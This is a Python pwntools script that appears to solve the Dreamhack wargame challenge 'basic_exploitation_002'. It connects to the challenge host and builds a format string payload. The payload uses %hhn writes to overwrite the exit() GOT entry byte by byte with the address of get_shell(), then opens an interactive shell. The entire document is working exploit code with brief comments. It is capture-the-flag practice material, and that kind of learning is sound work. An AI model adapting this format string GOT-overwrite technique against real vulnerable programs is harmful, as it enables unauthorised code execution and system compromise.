#!/bin/python3
from pwn import *

context.os = "linux"
context.arch = "i386"

"""
Good reference on how to abuse printf format string vulnerability
https://www.youtube.com/watch?v=t1LH9D5cuK4
"""

r = remote("host1.dreamhack.games", 24495)
#r = process("./basic_exploitation_002", stdin=PTY)
elf = ELF("./basic_exploitation_002")

# addr of get_shell()
addr_shell = elf.symbols["get_shell"]
baddr_shell = addr_shell.to_bytes(4, byteorder="little")
# addr of libc exit() as in exit@plt's first jump destination
addr_exit = elf.got["exit"]

print(f"shell @ {hex(addr_shell)} == {baddr_shell}")
print(f"exit @ {hex(addr_exit)}")

# Format string attack
# stack: char[0x80] + ebp + ret addr
# overwrite address a byte each time
payload = b''.join( p32(addr_exit + i) for i in range(4) )
print_count = len(payload)
for i in range(4):
	print_remain = (baddr_shell[i] - print_count) % 256
	if print_remain < 8:
		print_remain += 256 # In case address exceeds expected print count
	print(f"must print {print_remain} more to reach {baddr_shell[i]}")

	payload += f"%{print_remain}x".encode() # print_remain = width of string
	payload += f"%{i + 1}$hhn".encode()

	print_count += print_remain

# Terminate string
payload += b"\n\0"

#print(f"sending payload...\n{payload}\n======")

r.sendline(payload)
r.interactive()
